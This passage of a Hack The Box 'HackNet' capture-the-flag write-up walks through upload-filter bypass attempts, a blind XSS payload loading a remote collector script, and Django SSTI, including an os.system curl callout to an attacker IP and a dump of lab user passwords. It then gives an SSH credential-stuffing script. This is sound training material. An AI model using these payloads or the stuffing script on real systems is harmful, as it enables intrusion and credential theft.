        <input type="hidden" name="csrfmiddlewaretoken" value="aDl1ZibtUYbsNaGxdk6qK111VVd7kYcRsVNIWGhEzzMdslD5FA83pU71B7tOYu4X">
        <input type="file" name="picture" accept="image/png, image/jpeg">
        <input type="email" name="email" placeholder="1@2.1">
        <input name="username" placeholder="1">
        <input type="password" name="password" placeholder="***********">
        <textarea name="about" rows="4"></textarea>
        <div><input type="checkbox" name="is_public" checked> Public</div>
        <div><input type="checkbox" name="two_fa" > 2FA</div>
        <button type="submit">Save</button>
    </form>
    <div id="profile-right-emp"></div>
</div>
```

- we know the upload directory is `/media` 
- The application seems to accept only jpeg and png

Will test with uploading a jpg file .... uploaded successfully and got this from the response:

```html
<h2 id="m_er">Profile updated</h2>
```

and the image is now present at `http://hacknet.htb/media/1_ySTjcgT.jpg`

now trying to upload an svg image to attempt xxe

![hacknet-7](/images/hacknet/Pasted image 20250918211643.png)

this is the html part from the response that determines if an image was successfully uploaded:

```html
<h2 id="m_er">Bad picture</h2>
```

didn't work so what I will do is try to inject php code within magic bytes

![hacknet-8](/images/hacknet/Pasted image 20250918211820.png)

```html
<h2 id="m_er">Profile updated</h2>
```

try to go to the image and inject commands

![hacknet-9](/images/hacknet/Pasted image 20250918212027.png)

the magic bytes seem to bypass the MIME-type filter however we cannot execute commands

I will fuzz for allowed extensions and use this command to generate a wordlist for our case:

```shell
cat /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt | grep -E 'php|phar|phtml' | grep -E 'jpg|png|jpeg' > wordlist.txt
```

![hacknet-10](/images/hacknet/Pasted image 20250918213032.png)

I tried a couple of the filenames from the profile updated responses

and the image is reflected in the response with no command execution

looks like a dead end here

### Directory Busting

I will try directory busting to see if there are any hidden endpoints that are vulnerable or expose any sensitive information

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -u "http://hacknet.htb/FUZZ" -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

media                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 202ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
login                   [Status: 200, Size: 857, Words: 160, Lines: 24, Duration: 202ms]
comment                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 226ms]
register                [Status: 200, Size: 948, Words: 178, Lines: 25, Duration: 226ms]
search                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 226ms]
contacts                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
profile                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 73ms]
post                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
messages                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
explore                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 68ms]
                        [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 75ms]
:: Progress: [1377707/1377707] :: Job [1/1] :: 335 req/sec :: Duration: [0:50:15] :: Errors: 241 ::
```

Run the fuzz again with recursive mode

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://hacknet.htb/FUZZ" -ic -recursion -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

profile                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 102ms]
media                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 102ms]
[INFO] Adding a new job to the queue: http://hacknet.htb/media/FUZZ

                        [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 126ms]
search                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 125ms]
register                [Status: 200, Size: 948, Words: 178, Lines: 25, Duration: 136ms]
login                   [Status: 200, Size: 857, Words: 160, Lines: 24, Duration: 136ms]
contacts                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
post                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 86ms]
comment                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 90ms]
messages                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 67ms]
explore                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 79ms]
                        [Status: 200, Size: 667, Words: 152, Lines: 23, Duration: 146ms]
[INFO] Starting queued job on target: http://hacknet.htb/media/FUZZ

                        [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 133ms]
                        [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 63ms]
:: Progress: [1273819/1273819] :: Job [2/2] :: 1388 req/sec :: Duration: [0:14:03] :: Errors: 0 ::

```

### CVE Approach

We know that the version of the server is nginx 1.22.1

![hacknet-11](/images/hacknet/Pasted image 20250922104428.png)

ONe interesting CVE for that version is CVE-2022-41742, I will use this POC https://github.com/moften/CVE-2022-4174_CVE-2022-41742/blob/main/CVE-2022-4174_CVE-2022-41742.py

```shell
python test.py                                  
[+] Servidor Nginx detectado: versión 1.22.1
[!] Esta versión puede ser vulnerable. Consulta CVE-2023-44487 y otras vulnerabilidades conocidas.
[-] ngx_http_mp4_module no detectado en el servidor.
[!] Posible vulnerabilidad detectada:
    - CVE-2023-44487: HTTP/2 Rapid Reset Attack.
    * Se recomienda deshabilitar HTTP/2 si no es necesario o aplicar las mitigaciones recomendadas por Nginx.

```

which translates to:

```text
Nginx Server Detected: Version 1.22.1 
[!] This version may be vulnerable. Check CVE-2023-44487 and other known vulnerabilities.  
[-] `ngx_http_mp4_module` not detected on the server.  
[!] Possible vulnerability detected:  
  - **CVE-2023-44487: HTTP/2 Rapid Reset Attack.**  
  * It is recommended to disable HTTP/2 if not needed or apply the mitigations recommended by Nginx.
```


### XSS

Hints on the discord disclosed that there is an XSS bot. So there seems to be an XSS vulnerability in the page somewhere

After I have fuzzed the search page a bit, there is no trace of user input in the output page source code, so I will try blind XSS, using this guide: https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide, and I will set up a blind XSS catcher using this tool: https://github.com/daxAKAhackerman/XSS-Catcher

Sending messages to users seems like a good spot for blind XSS

![hacknet-12](/images/hacknet/Pasted image 20250922215638.png)

I will try it first and by sending to backdoor bandit user

this is the payload I will send:

![hacknet-13](/images/hacknet/Pasted image 20250923123925.png)

```html
'>"><script src=http://0.0.0.0:8080/static/collector.min.js data="cyxQZ01BRmYsLHNvbWV0YWcsTkRBck1nPT0="></script>
```

No callback...

I have to read the frontend code more and check where there may be opportunities for XSS again because spamming the payload at every user input won't help and does not imply I am learning, unfortunately there is no source code accessible to the user end and if we try to send payloads we cannot know which work adn which not

### SSTI

I got a nudge from someone who solved the machine and he told me:
`There is basically SSTI on the username field, but the SSTI is only being triggered, if you like a post with /like/POSTID and navigate to /likes/POSTID`

so I will try to understand more about SSTI with these guides:
- https://tcm-sec.com/find-and-exploit-server-side-template-injection-ssti/
- https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/
- https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
- https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

I will first check the response when requesting the likes of a port :

this is for GET /likes/10:

```html
<div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div><div class="likes-review-item"><a href="/profile/6"><img src="/media/6.jpg" title="shadowcaster"></a></div><div class="likes-review-item"><a href="/profile/7"><img src="/media/7.png" title="blackhat_wolf"></a></div><div class="likes-review-item"><a href="/profile/9"><img src="/media/9.png" title="glitch"></a></div><div class="likes-review-item"><a href="/profile/12"><img src="/media/12.png" title="codebreaker"></a></div><div class="likes-review-item"><a href="/profile/16"><img src="/media/16.png" title="shadowmancer"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div><div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shadowwalker"></a></div>
```

so when I changed my username to `${7*7}` and liked post 10, I got this in the response:

```html
<div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div><div class="likes-review-item"><a href="/profile/6"><img src="/media/6.jpg" title="shadowcaster"></a></div><div class="likes-review-item"><a href="/profile/7"><img src="/media/7.png" title="blackhat_wolf"></a></div><div class="likes-review-item"><a href="/profile/9"><img src="/media/9.png" title="glitch"></a></div><div class="likes-review-item"><a href="/profile/12"><img src="/media/12.png" title="codebreaker"></a></div><div class="likes-review-item"><a href="/profile/16"><img src="/media/16.png" title="shadowmancer"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div><div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shadowwalker"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="${7*7}"></a></div>
```

indicating that there is no escape of user input.... then I changed the username to `{{7*7}}`

and got this response:

```html
<div class="likes-review-item"><a>Something went wrong...</a></div>
```

which looks like the server is executing the computation but not returning anything

I will try this payload to check if there is interaction on the backend side: `{{ cycler.__init__.__globals__.os.system("curl http://10.10.16.15:8999/") }}`

I am getting a 500 server error upon sending the POST request:

```html
<!doctype html>
<html lang="en">
<head>
  <title>Server Error (500)</title>
</head>
<body>
  <h1>Server Error (500)</h1><p></p>
</body>
</html>

```

which means there is definitely SSTI but I don't know a valid payload

`{{ users.values }}`

with the response:

```html
<div class="likes-review-item"><a href="/profile/2"><img src="/media/2.jpg" title="hexhunter"></a></div><div class="likes-review-item"><a href="/profile/6"><img src="/media/6.jpg" title="shadowcaster"></a></div><div class="likes-review-item"><a href="/profile/7"><img src="/media/7.png" title="blackhat_wolf"></a></div><div class="likes-review-item"><a href="/profile/9"><img src="/media/9.png" title="glitch"></a></div><div class="likes-review-item"><a href="/profile/12"><img src="/media/12.png" title="codebreaker"></a></div><div class="likes-review-item"><a href="/profile/16"><img src="/media/16.png" title="shadowmancer"></a></div><div class="likes-review-item"><a href="/profile/21"><img src="/media/21.jpg" title="whitehat"></a></div><div class="likes-review-item"><a href="/profile/24"><img src="/media/24.jpg" title="brute_force"></a></div><div class="likes-review-item"><a href="/profile/25"><img src="/media/25.jpg" title="shadowwalker"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="&lt;QuerySet [{&#x27;id&#x27;: 2, &#x27;email&#x27;: &#x27;hexhunter@ciphermail.com&#x27;, &#x27;username&#x27;: &#x27;hexhunter&#x27;, &#x27;password&#x27;: &#x27;H3xHunt3r!&#x27;, &#x27;picture&#x27;: &#x27;2.jpg&#x27;, &#x27;about&#x27;: &#x27;A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 6, &#x27;email&#x27;: &#x27;shadowcaster@darkmail.net&#x27;, &#x27;username&#x27;: &#x27;shadowcaster&#x27;, &#x27;password&#x27;: &#x27;Sh@d0wC@st!&#x27;, &#x27;picture&#x27;: &#x27;6.jpg&#x27;, &#x27;about&#x27;: &#x27;Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 7, &#x27;email&#x27;: &#x27;blackhat_wolf@cypherx.com&#x27;, &#x27;username&#x27;: &#x27;blackhat_wolf&#x27;, &#x27;password&#x27;: &#x27;Bl@ckW0lfH@ck&#x27;, &#x27;picture&#x27;: &#x27;7.png&#x27;, &#x27;about&#x27;: &#x27;A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 9, &#x27;email&#x27;: &#x27;glitch@cypherx.com&#x27;, &#x27;username&#x27;: &#x27;glitch&#x27;, &#x27;password&#x27;: &#x27;Gl1tchH@ckz&#x27;, &#x27;picture&#x27;: &#x27;9.png&#x27;, &#x27;about&#x27;: &#x27;Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 12, &#x27;email&#x27;: &#x27;codebreaker@ciphermail.com&#x27;, &#x27;username&#x27;: &#x27;codebreaker&#x27;, &#x27;password&#x27;: &#x27;C0d3Br3@k!&#x27;, &#x27;picture&#x27;: &#x27;12.png&#x27;, &#x27;about&#x27;: &#x27;A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 16, &#x27;email&#x27;: &#x27;shadowmancer@cypherx.com&#x27;, &#x27;username&#x27;: &#x27;shadowmancer&#x27;, &#x27;password&#x27;: &#x27;Sh@d0wM@ncer&#x27;, &#x27;picture&#x27;: &#x27;16.png&#x27;, &#x27;about&#x27;: &#x27;A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 21, &#x27;email&#x27;: &#x27;whitehat@darkmail.net&#x27;, &#x27;username&#x27;: &#x27;whitehat&#x27;, &#x27;password&#x27;: &#x27;Wh!t3H@t2024&#x27;, &#x27;picture&#x27;: &#x27;21.jpg&#x27;, &#x27;about&#x27;: &#x27;An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 24, &#x27;email&#x27;: &#x27;brute_force@ciphermail.com&#x27;, &#x27;username&#x27;: &#x27;brute_force&#x27;, &#x27;password&#x27;: &#x27;BrUt3F0rc3#&#x27;, &#x27;picture&#x27;: &#x27;24.jpg&#x27;, &#x27;about&#x27;: &#x27;Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 25, &#x27;email&#x27;: &#x27;shadowwalker@hushmail.com&#x27;, &#x27;username&#x27;: &#x27;shadowwalker&#x27;, &#x27;password&#x27;: &#x27;Sh@dowW@lk2024&#x27;, &#x27;picture&#x27;: &#x27;25.jpg&#x27;, &#x27;about&#x27;: &#x27;A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: False}, {&#x27;id&#x27;: 27, &#x27;email&#x27;: &#x27;test@test.com&#x27;, &#x27;username&#x27;: &#x27;{{ users.values }}        &#x27;, &#x27;password&#x27;: &#x27;testtest&#x27;, &#x27;picture&#x27;: &#x27;profile.png&#x27;, &#x27;about&#x27;: &#x27;&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: True, &#x27;two_fa&#x27;: False}]&gt;        "></a></div>
```

HTML decode this to:

```JSON
<QuerySet [{'id': 2, 'email': 'hexhunter@ciphermail.com', 'username': 'hexhunter', 'password': 'H3xHunt3r!', 'picture': '2.jpg', 'about': 'A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 6, 'email': 'shadowcaster@darkmail.net', 'username': 'shadowcaster', 'password': 'Sh@d0wC@st!', 'picture': '6.jpg', 'about': 'Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 7, 'email': 'blackhat_wolf@cypherx.com', 'username': 'blackhat_wolf', 'password': 'Bl@ckW0lfH@ck', 'picture': '7.png', 'about': 'A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 9, 'email': 'glitch@cypherx.com', 'username': 'glitch', 'password': 'Gl1tchH@ckz', 'picture': '9.png', 'about': 'Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 12, 'email': 'codebreaker@ciphermail.com', 'username': 'codebreaker', 'password': 'C0d3Br3@k!', 'picture': '12.png', 'about': 'A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 16, 'email': 'shadowmancer@cypherx.com', 'username': 'shadowmancer', 'password': 'Sh@d0wM@ncer', 'picture': '16.png', 'about': 'A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 21, 'email': 'whitehat@darkmail.net', 'username': 'whitehat', 'password': 'Wh!t3H@t2024', 'picture': '21.jpg', 'about': 'An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 24, 'email': 'brute_force@ciphermail.com', 'username': 'brute_force', 'password': 'BrUt3F0rc3#', 'picture': '24.jpg', 'about': 'Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 25, 'email': 'shadowwalker@hushmail.com', 'username': 'shadowwalker', 'password': 'Sh@dowW@lk2024', 'picture': '25.jpg', 'about': 'A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 27, 'email': 'test@test.com', 'username': '{{ users.values }}        ', 'password': 'testtest', 'picture': 'profile.png', 'about': '', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': True, 'two_fa': False}]>
```

From chat:

```text
The `{{ users.values }}` SSTI payload attempts to access the `values` method of a `users` QuerySet (likely `User.objects.all()`) in a Django template. While it doesn't execute the method (since there are no parentheses), the template engine evaluates the expression and returns the string representation of the method object—typically something like `<bound method QuerySet.values of <QuerySet [...]>>`. This confirms that the template engine is evaluating user-supplied input, which is a key indicator of server-side template injection (SSTI). If an attacker can then use `{{ users.values() }}`, they could extract all user data as dictionaries, potentially exposing sensitive fields like emails and passwords, depending on how data is structured and secured.
```

this means the full Django QuerySet dump is returned with user creds 

```text
A Django QuerySet is a list of objects from a database table that match certain criteria, representing a collection of objects from your database. It is a fundamental concept in Django’s Object-Relational Mapper (ORM), allowing developers to retrieve, filter, order, and slice data without directly writing SQL.
```

 
## Gaining User Flag

So now I will have to try each credential for SSH and for that I must use a script to parse the dump into a user:pass and perform credential stuffing on the SSH port

This is the python script that I will use:

```python
import ast
import subprocess
import time

# === Step 1: Raw Dump ===
raw_dump = """<QuerySet [{'id': 2, 'email': 'hexhunter@ciphermail.com', 'username': 'hexhunter', 'password': 'H3xHunt3r!', 'picture': '2.jpg', 'about': 'A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 6, 'email': 'shadowcaster@darkmail.net', 'username': 'shadowcaster', 'password': 'Sh@d0wC@st!', 'picture': '6.jpg', 'about': 'Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 7, 'email': 'blackhat_wolf@cypherx.com', 'username': 'blackhat_wolf', 'password': 'Bl@ckW0lfH@ck', 'picture': '7.png', 'about': 'A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 9, 'email': 'glitch@cypherx.com', 'username': 'glitch', 'password': 'Gl1tchH@ckz', 'picture': '9.png', 'about': 'Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 12, 'email': 'codebreaker@ciphermail.com', 'username': 'codebreaker', 'password': 'C0d3Br3@k!', 'picture': '12.png', 'about': 'A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 16, 'email': 'shadowmancer@cypherx.com', 'username': 'shadowmancer', 'password': 'Sh@d0wM@ncer', 'picture': '16.png', 'about': 'A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 21, 'email': 'whitehat@darkmail.net', 'username': 'whitehat', 'password': 'Wh!t3H@t2024', 'picture': '21.jpg', 'about': 'An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 24, 'email': 'brute_force@ciphermail.com', 'username': 'brute_force', 'password': 'BrUt3F0rc3#', 'picture': '24.jpg', 'about': 'Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 25, 'email': 'shadowwalker@hushmail.com', 'username': 'shadowwalker', 'password': 'Sh@dowW@lk2024', 'picture': '25.jpg', 'about': 'A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 27, 'email': 'test@test.com', 'username': '{{ users.values }}        ', 'password': 'testtest', 'picture': 'profile.png', 'about': '', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': True, 'two_fa': False}]>"""

# === Step 2: Parse safely ===
print("[*] Parsing credentials...")
data_str = raw_dump.strip()[10:-1]  # Remove <QuerySet  and >
data = ast.literal_eval(data_str)

# === Step 3: Extract username:password pairs ===
credentials = []
for user in data:
    username = user.get("username", "").strip()
    password = user.get("password", "").strip()
    if "{{" in username or username == "":
        continue
    credentials.append((username, password))

print(f"[+] Extracted {len(credentials)} valid credentials.")

# === Step 4: SSH Brute-force using sshpass ===
host = "hacknet.htb"

print("[*] Starting SSH credential stuffing...\n")

for username, password in credentials:
    print(f"[*] Trying {username}:{password} ...")

    try:
        # Use sshpass to try SSH login non-interactively
        result = subprocess.run(
            [
                "sshpass", "-p", password,
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=5",
                f"{username}@{host}", "echo login_success"
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL
        )

        output = result.stdout.decode().strip()
        if "login_success" in output:
            print(f"[+] SUCCESS! Valid credentials: {username}:{password}")
            break

    except FileNotFoundError:
        print("[-] sshpass is not installed. Run: sudo apt install sshpass")
        break

    time.sleep(0.5)

print("[*] Done.")

```


```shell
python ssh_cred_stuffing.py 
[*] Parsing credentials...
[+] Extracted 9 valid credentials.
[*] Starting SSH brute-force attempts...

[*] Trying hexhunter:H3xHunt3r! ...
[*] Trying shadowcaster:Sh@d0wC@st! ...
[*] Trying blackhat_wolf:Bl@ckW0lfH@ck ...
[*] Trying glitch:Gl1tchH@ckz ...
[*] Trying codebreaker:C0d3Br3@k! ...
[*] Trying shadowmancer:Sh@d0wM@ncer ...
[*] Trying whitehat:Wh!t3H@t2024 ...
[*] Trying brute_force:BrUt3F0rc3# ...
[*] Trying shadowwalker:Sh@dowW@lk2024 ...
[*] Done.
```

I think the users are not enough, I will like all the posts and query each for the likes using burp intruder, the range will be 1 30 -> I will run intruder twice (once for liking the posts and another for querying the likes on a post) This way all the users on each of their liked post will have their credentials dumped 

To make sure:

![hacknet-14](/images/hacknet/Pasted image 20250924095213.png)

All posts in the 3 pages are liked

Now check intruder output for query, all gave a unique queryset dump, unfortunately I have to html decode each and every queryset dump from each and every response because lovely Burp Suite does not allow to download the server responses from intruder in Community edition, so I will run a script that automates curling each post and parses each response for the query set dump and generates a combined queryset from all the responses (unqiue values of course)

```python
import subprocess

import html

import ast

import re

import time

from typing import List, Optional, Dict, Tuple, Set

  

TARGET_HOST = "http://hacknet.htb"

POST_ID_RANGE = range(1, 27) # 1..26

  

# Put your full cookie string here (same format as curl -H "Cookie: name=value; name2=value2")

COOKIES_STR: Optional[str] = "csrftoken=ssCR7yglPLLVPl7ICqcNP3gaQmqROG2g; sessionid=lxo8b3a2fxozyl3xj47wamn8626upc8u"

  

# Basic headers to present to the server (we'll add Cookie header into the curl command)

COMMON_HEADERS = {

"User-Agent": "Mozilla/5.0",

"Accept": "*/*",

"Referer": f"{TARGET_HOST}/explore",

"X-Requested-With": "XMLHttpRequest",

}

  

def make_curl_cmd(url: str, cookies: Optional[str] = None) -> List[str]:

# Build curl command as a list (no shell). Include --compressed.

cmd = [

"curl", url, "--compressed",

"-H", f"User-Agent: {COMMON_HEADERS['User-Agent']}",

"-H", f"Accept: {COMMON_HEADERS['Accept']}",

"-H", f"Referer: {COMMON_HEADERS['Referer']}",

"-H", f"X-Requested-With: {COMMON_HEADERS['X-Requested-With']}",

"-H", "Connection: keep-alive",

"--max-time", "10",

"--silent",

]

if cookies:

cmd.extend(["-H", f"Cookie: {cookies}"])

return cmd

  

def fetch_post_response_with_curl(post_id: int, cookies: Optional[str] = None) -> str:

url = f"{TARGET_HOST}/likes/{post_id}"

curl_cmd = make_curl_cmd(url, cookies=cookies)

try:

result = subprocess.run(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=12)

return result.stdout.decode("utf-8", errors="ignore")

except subprocess.TimeoutExpired:

print(f" [!] curl timeout for {url}")

return ""

except Exception as e:

print(f" [!] Error running curl for {url}: {e}")

return ""

  

def extract_queryset_encoded(response: str) -> Optional[str]:

"""

Find the title attribute of the profile 27 image, which contains the

HTML-encoded QuerySet dump. Use a robust regex that tolerates other attributes.

"""

m = re.search(r'<a\s+href="/profile/27">.*?<img\b[^>]*\btitle="([^"]+)"', response, flags=re.DOTALL | re.IGNORECASE)

if not m:

return None

return m.group(1)

  

def parse_queryset(encoded_str: str) -> List[dict]:

"""

Decode HTML entities and safely parse the Python-list inside <QuerySet [...]>.

Returns a list of dicts or empty list on failure.

"""

try:

decoded = html.unescape(encoded_str).strip()

# Extract the [...] inside <QuerySet [...]>

m = re.search(r'<QuerySet\s*(\[[\s\S]*?\])\s*>', decoded)

inner = None

if m:

inner = m.group(1)

else:

# Fallback: maybe decoded is already the list-like string

if decoded.startswith("[") and decoded.endswith("]"):

inner = decoded

if not inner:

print(" [!] Could not locate the inner list for QuerySet parsing")

return []

data = ast.literal_eval(inner)

if isinstance(data, list):

return data

return []

except Exception as e:

